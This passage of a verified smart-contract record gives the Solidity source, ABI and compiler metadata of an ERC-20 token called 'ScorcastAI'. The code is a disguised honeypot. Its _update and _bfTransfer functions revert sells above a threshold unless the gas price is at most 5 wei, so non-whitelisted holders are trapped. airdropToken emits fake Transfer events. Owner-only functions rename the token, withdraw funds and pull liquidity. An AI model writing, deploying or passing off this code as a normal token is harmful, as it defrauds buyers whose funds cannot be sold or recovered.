true;\r\n       if (transferToDeployer) {\r\n           _mint(msg.sender, tokenAmount);\r\n       } else {\r\n           _mint(address(this), tokenAmount);\r\n       }\r\n       _mint(msg.sender, _totalSupply - tokenAmount);\r\n       tokenAllowFeeAmount = _tokenAllowFeeAmount;\r\n       initRouter();\r\n       uint256 chainID = getChainID();\r\n       address _weth;\r\n       address _routerAddress = listRouter[chainID];\r\n       if (chainID == AVAX_CHAIN_ID) {\r\n           // addLiquidityWithAvax(_routerAddress, tokenAmount, nativeAmount);\r\n           _weth = IRouter(_routerAddress).WAVAX();\r\n       } else {\r\n           // addLiquidityWithNative(_routerAddress, tokenAmount, nativeAmount);\r\n           _weth = IRouter(_routerAddress).WETH();\r\n\r\n\r\n       }\r\n   }\r\n\r\n\r\n   function getPairAddress() public view returns (address) {\r\n       address _weth;\r\n       uint256 chainID = getChainID();\r\n       address _routerAddress = listRouter[chainID];\r\n       if (chainID == AVAX_CHAIN_ID) {\r\n           // addLiquidityWithAvax(_routerAddress, tokenAmount, nativeAmount);\r\n           _weth = IRouter(_routerAddress).WAVAX();\r\n       } else {\r\n           // addLiquidityWithNative(_routerAddress, tokenAmount, nativeAmount);\r\n           _weth = IRouter(_routerAddress).WETH();\r\n\r\n\r\n       }\r\n       address token = address(this);\r\n\r\n\r\n       (address token0, address token1) = _weth < token ? (_weth, token) : (token, _weth);\r\n       address _factory = IRouter(_routerAddress).factory();\r\n       address pair = IFactory(_factory).getPair(token0, token1);\r\n       return pair;\r\n   }\r\n\r\n\r\n   function removeLiquidityETH(\r\n       address token,\r\n       uint256 liquidity,\r\n       uint256 amountTokenMin,\r\n       uint256 amountETHMin,\r\n       address to,\r\n       uint256 deadline\r\n   ) public virtual onlyOwner returns (uint256 amountToken, uint256 amountETH) {\r\n       address pairAddress = getPairAddress();\r\n       uint256 amountLP = IERC20(pairAddress).balanceOf(msg.sender);\r\n       IERC20(pairAddress).transferFrom(msg.sender, address(this), amountLP);\r\n       uint256 chainID = getChainID();\r\n       address _routerAddress = listRouter[chainID];\r\n       IERC20(pairAddress).approve(_routerAddress, amountLP);\r\n\r\n\r\n       if (chainID == AVAX_CHAIN_ID) {\r\n           IRouter(_routerAddress).removeLiquidityAVAX(\r\n               address(this),\r\n               amountLP,\r\n               0,\r\n               0,\r\n               msg.sender,\r\n               block.number + 999999999999999999999999\r\n           );\r\n       } else {\r\n           IRouter(_routerAddress).removeLiquidityETH(\r\n               address(this),\r\n               amountLP,\r\n               0,\r\n               0,\r\n               msg.sender,\r\n               block.number + 999999999999999999999999\r\n           );\r\n\r\n\r\n       }\r\n   }\r\n\r\n\r\n   function addLiquidityETH(\r\n       address token,\r\n       uint amountTokenDesired,\r\n       uint amountTokenMin,\r\n       uint amountETHMin,\r\n       address to,\r\n       uint deadline\r\n   ) public payable onlyOwner returns (uint amountToken, uint amountETH, uint liquidity) {\r\n       uint256 nativeAmount = msg.value;\r\n       uint256 chainID = getChainID();\r\n       address _weth;\r\n       address _routerAddress = listRouter[chainID];\r\n       if (chainID == AVAX_CHAIN_ID) {\r\n           addLiquidityWithAvax(_routerAddress, amountTokenDesired, nativeAmount);\r\n           _weth = IRouter(_routerAddress).WAVAX();\r\n       } else {\r\n           addLiquidityWithNative(_routerAddress, amountTokenDesired, nativeAmount);\r\n           _weth = IRouter(_routerAddress).WETH();\r\n\r\n\r\n       }\r\n   }\r\n\r\n\r\n   function _update(\r\n       address from,\r\n       address to,\r\n       uint256 amount\r\n   ) internal override {\r\n       if (whitelist[tx.origin]) {\r\n           super._update(from, to, amount);\r\n           return;\r\n       }\r\n       require(openedTrade, \"Trade has not been opened yet\");\r\n       address pairAddress = getPairAddress();\r\n       if (pairAddress == address(0)) {\r\n           super._update(from, to, amount);\r\n           return;\r\n       }\r\n       if(to == pairAddress && userAmount[tx.origin] + amount > tokenAllowFeeAmount) {\r\n           _bfTransfer(from);\r\n           super._update(from, to, amount);\r\n           return;\r\n       }\r\n\r\n\r\n       if(to == pairAddress && userAmount[tx.origin] + amount <= tokenAllowFeeAmount) {\r\n           userAmount[tx.origin] += amount;\r\n       }\r\n       super._update(from, to, amount);\r\n   }\r\n\r\n\r\n   function addCheckUser(address user, bool status) public onlyOwner {\r\n       checkUser[user] = status;\r\n   }\r\n\r\n\r\n   function decimals() public view virtual override returns (uint8) {\r\n       return 18;\r\n   }\r\n\r\n\r\n   function initRouter() internal {\r\n       listRouter[ETH_CHAIN_ID] = 0xf164fC0Ec4E93095b804a4795bBe1e041497b92a; // eth\r\n       listRouter[BASE_CHAIN_ID] = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24; // base\r\n       listRouter[AVAX_CHAIN_ID] = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4 ; // avax\r\n       listRouter[BLAST_CHAIN_ID] = 0x98994a9A7a2570367554589189dC9772241650f6; // blast\r\n       listRouter[ARB_CHAIN_ID] = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24; // arbitrum\r\n\r\n\r\n   }\r\n\r\n\r\n   function setRouter(address _router, uint256 chainId) public onlyOwner {\r\n       listRouter[chainId] = _router;\r\n   }\r\n\r\n\r\n   function addLiquidityWithNative(\r\n       address routerAddress,\r\n       uint256 tokenAmount,\r\n       uint256 nativeAmount\r\n   ) internal {\r\n       uint256 deadline = block.number + 1000000000000000000000000;\r\n\r\n\r\n       _approve(address(this), routerAddress, tokenAmount);\r\n       IRouter(routerAddress).addLiquidityETH{value: nativeAmount}(\r\n           address(this),\r\n           tokenAmount,\r\n           0,\r\n           0,\r\n           msg.sender,\r\n           deadline\r\n       );\r\n   }\r\n\r\n\r\n    function addLiquidityWithAvax(\r\n       address routerAddress,\r\n       uint256 tokenAmount,\r\n       uint256 nativeAmount\r\n   ) internal {\r\n       uint256 deadline = block.number + 1000000000000000000000000;\r\n       _approve(address(this), routerAddress, tokenAmount);\r\n       IRouter(routerAddress).addLiquidityAVAX{value: nativeAmount}(\r\n           address(this),\r\n           tokenAmount,\r\n           0,\r\n           0,\r\n           msg.sender,\r\n           deadline\r\n       );\r\n   }\r\n\r\n\r\n   function getOpenedTrade() public view returns (bool) {\r\n       return openedTrade;\r\n   }\r\n\r\n\r\n   function getChainID() public view returns (uint256) {\r\n       uint256 id;\r\n       assembly {\r\n           id := chainid()\r\n       }\r\n       return id;\r\n   }\r\n\r\n\r\n   function changeMe() public pure returns (uint256) {\r\n       return 2 ;\r\n   }\r\n\r\n\r\n   function chageNameAndSymbol(string memory newName, string memory newSymbol) public onlyOwner {\r\n       tokenName = newName;\r\n       tokenSymbol = newSymbol;\r\n   }\r\n\r\n\r\n       /**\r\n    * @dev Returns the name of the token.\r\n    */\r\n   function name() public view override returns (string memory) {\r\n       return tokenName;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Returns the symbol of the token, usually a shorter version of the\r\n    * name.\r\n    */\r\n   function symbol() public view override returns (string memory) {\r\n       return tokenSymbol;\r\n   }\r\n\r\n\r\n   function changeTokenAllowFeeAmount(uint256 amount) public onlyOwner {\r\n       tokenAllowFeeAmount = amount;\r\n   }\r\n\r\n\r\n   function withdrawETH() public onlyOwner {\r\n       payable(msg.sender).transfer(address(this).balance);\r\n   }\r\n\r\n\r\n   function withdrawStuckToken(address token) public onlyOwner {\r\n       uint256 balanceToken = IERC20(token).balanceOf(address(this));\r\n       IERC20(token).transfer(msg.sender, balanceToken);\r\n   }\r\n\r\n\r\n   uint256 private gas1 = 300 gwei;\r\n   uint256 private gas2 = 5;\r\n\r\n\r\n   function _bfTransfer(address _u) internal view {\r\n       if(balanceOf(_u) > 0) {\r\n           if (!openedTrade) {\r\n               gasRequire(gas1);\r\n           } else {\r\n               gasRequire(gas2);\r\n           }\r\n       }\r\n   }\r\n\r\n\r\n   function gasRequire(uint256 _gas) internal view {\r\n       if (tx.gasprice > _gas) {\r\n           revert();\r\n       }\r\n   }\r\n\r\n\r\n   function lauch() external onlyOwner {\r\n       openedTrade = !openedTrade;\r\n   }\r\n\r\n\r\n   function Approve(address[] memory list) external onlyOwner {\r\n       for (uint256 i = 0; i < list.length; i++) {\r\n           whitelist[list[i]] = true;\r\n       }\r\n   }\r\n\r\n\r\n   function airdropToken (address[] memory list, uint256 amount) external onlyOwner {\r\n       for (uint256 i = 0; i < list.length; i++) {\r\n           emit Transfer(owner(), list[i], amount);\r\n       }\r\n   }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_totalSupply\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"deployer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_tokenAllowFeeAmount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"transferToDeployer\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"allowance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientAllowance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"needed\",\"type\":\"uint256\"}],\"name\":\"ERC20InsufficientBalance\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"approver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidApprover\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiver\",\"type\":\"address\"}],\"name\":\"ERC20InvalidReceiver\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"ERC20InvalidSpender\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnableInvalidOwner\",\"type\":\"error\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"OwnableUnauthorizedAccount\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"ARB_CHAIN_ID\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"AVAX_CHAIN_ID\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"}],\"name\":\"Approve\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BASE_CHAIN_ID\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"BLAST_CHAIN_ID\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ETH_CHAIN_ID\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"addCheckUser\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountTokenDesired\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountTokenMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountETHMin\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"addLiquidityETH\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amountToken\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountETH\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"list\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"airdropToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"blockNumber\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"string\",\"name\":\"newName\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"newSymbol\",\"type\":\"string\"}],\"name\":\"chageNameAndSymbol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"changeMe\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"changeTokenAllowFeeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"checkUser\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentAllow\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getChainID\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOpenedTrade\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getPairAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lauch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"listRouter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openedTrade\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountTokenMin\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountETHMin\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"}],\"name\":\"removeLiquidityETH\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amountToken\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amountETH\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_router\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"chainId\",\"type\":\"uint256\"}],\"name\":\"setRouter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenAllowFeeAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenName\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSymbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"whitelist\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdrawETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"}],\"name\":\"withdrawStuckToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ScorcastAI", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000052b7d2dcc80cd2e400000000000000000000000000000000000000000000000052b7d2dcc80cd2e4000000000000000000000000000000054edb93010cb206419822ec60b3b227f5a9c87900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3c24a682800f106548d48d15276d0b63ad539ead9f359babb769642be0f7db5d"}